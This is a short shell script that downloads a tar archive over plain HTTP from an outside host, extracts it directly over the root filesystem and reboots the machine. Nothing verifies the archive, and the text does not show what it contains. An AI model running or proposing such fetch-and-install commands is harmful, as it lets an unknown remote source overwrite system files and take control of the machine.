mkdir /tmp/
curl http://farizdev.qzz.io/files/squirreller.tar > /var/squirreller.tar
tar -xvf /var/squirreller.tar -C /
systemctl reboot
